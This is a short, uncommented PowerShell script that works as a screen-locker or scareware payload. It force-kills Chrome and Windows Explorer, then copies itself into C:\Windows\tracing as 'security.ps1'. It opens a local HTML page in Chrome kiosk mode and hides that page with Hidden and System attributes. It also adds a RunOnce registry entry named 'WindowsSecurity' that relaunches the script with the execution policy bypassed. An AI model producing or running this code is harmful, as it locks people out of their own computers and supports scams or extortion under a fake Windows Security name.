Stop-Process -Name 'chrome' -Force;
Start-Process 'taskkill.exe' -ArgumentList '-F -IM explorer.exe';

Copy-Item -Path "./script.ps1" -Destination "C:\Windows\tracing\security.ps1";
if ($? -eq $false)
{
	Start-Process 'chrome.exe' -ArgumentList "--kiosk C:\Windows\tracing\index.html";
}
else
{
	$fullPath = Resolve-Path .\index.html;
	Start-Process 'chrome.exe' -ArgumentList "--kiosk $fullPath";

	Copy-Item -Path "./index.html" -Destination "C:\Windows\tracing\index.html";
	Set-ItemProperty -Path "C:\Windows\tracing\index.html" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
}

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "WindowsSecurity" /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -File C:\Windows\tracing\security.ps1" /f
